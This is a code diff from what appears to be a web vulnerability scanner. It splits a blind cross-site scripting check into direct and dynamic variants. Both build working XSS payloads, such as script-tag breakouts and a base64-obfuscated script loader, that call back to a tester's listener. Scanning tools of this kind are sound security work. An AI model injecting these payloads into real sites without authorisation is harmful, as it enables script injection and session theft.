@@ -6,21 +6,20 @@ name = __name__
 description = "checks for blind cross-site scripting"
 
 
-class CrossSiteScriptingBlindCheck(_BlindCheck):
+class CrossSiteScriptingBlindDirectCheck(_BlindCheck):
     """
     Checks for blind Cross-Site Scripting by executing callbacks. A listener server should be deployed and configured
     in order to listen for callbacks from the payloads.
     """
-    key = "xss.blind.callback"
-    name = "Blind Cross-Site Scripting"
-    description = "Checks for blind Cross-Site Scripting by injecting HTML tags"
+    key = "xss.blind.direct"
+    name = "Blind Cross-Site Scripting Direct"
+    description = "checks for blind cross-site scripting by injecting HTML tags directly"
+    example = '<img src="{}">'
 
     def __init__(self, listener):
         """
         Generate payloads by including the listener's endpoint into the templates. Payloads can reference the listener
-        directly or can add a reference to the listener dynamically through JavaScript. Direct payloads are shorter
-        and may bypass length restrictions. Dynamic payloads slightly obfuscate the listener and may prevent obvious
-        disclosure of access tokens in server or application logs.
+        directly. Direct payloads are shorter and may bypass length restrictions.
         :param listener: listener endpoint
         """
         directs = [
@@ -32,6 +31,39 @@ class CrossSiteScriptingBlindCheck(_BlindCheck):
             '"><script src="{}"></script><"'
         ]
 
+        # payloads
+        self._payloads = [payload.format(listener) for payload in directs]
+        self._listener = listener
+
+    def _check_payloads(self, payloads):
+        """
+        Checks if the payloads are adoptable for this class and modify the payloads to adjust to check function.
+        InvalidFormatException is raised, if a payload is not adoptable.
+        :param payloads: list of payloads
+        :return: list of modified payloads
+        """
+        for i, payload in enumerate(payloads):
+            payloads[i] = payload.format(self._listener)
+        return payloads
+
+
+class CrossSiteScriptingBlindDynamicCheck(_BlindCheck):
+    """
+    Checks for blind Cross-Site Scripting by executing callbacks. A listener server should be deployed and configured
+    in order to listen for callbacks from the payloads.
+    """
+    key = "xss.blind.dynamic"
+    name = "Blind Cross-Site Scripting Dynamic"
+    description = "checks for blind cross-site scripting by injecting HTML tags dynamically"
+    example = "<script>{}</script>"
+
+    def __init__(self, listener):
+        """
+        Generate payloads by including the listener's endpoint into the templates. Payloads can add a reference to
+        the listener dynamically through JavaScript. Dynamic payloads slightly obfuscate the listener and may prevent
+        obvious disclosure of access tokens in server or application logs.
+        :param listener: listener endpoint
+        """
         dynamics = [
             # two tags
             '<script>{}</script>',
@@ -54,11 +86,23 @@ class CrossSiteScriptingBlindCheck(_BlindCheck):
         encoded = base64.b64encode(listener.encode()).decode()
         script = template.format(encoded)
 
-        # add listener to direct payloads
-        direct_payloads = [payload.format(listener) for payload in directs]
+        # assign payloads
+        self._payloads = [payload.format(script) for payload in dynamics]
+        self._listener = listener
 
-        # add script to dynamic payloads
-        dynamic_payloads = [payload.format(script) for payload in dynamics]
+    def _check_payloads(self, payloads):
+        """
+        Checks if the payloads are adoptable for this class and modify the payloads to adjust to check function.
+        InvalidFormatException is raised, if a payload is not adoptable.
+        :param payloads: list of payloads
+        :return: list of modified payloads
+        """
+        # encode listener and format script
+        template = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);"
+        encoded = base64.b64encode(self._listener.encode()).decode()
+        script = template.format(encoded)
 
-        # combine payloads
-        self._payloads = direct_payloads + dynamic_payloads
+        # generate payloads
+        for i, payload in enumerate(payloads):
+            payloads[i] = payload.format(script)
+        return payloads
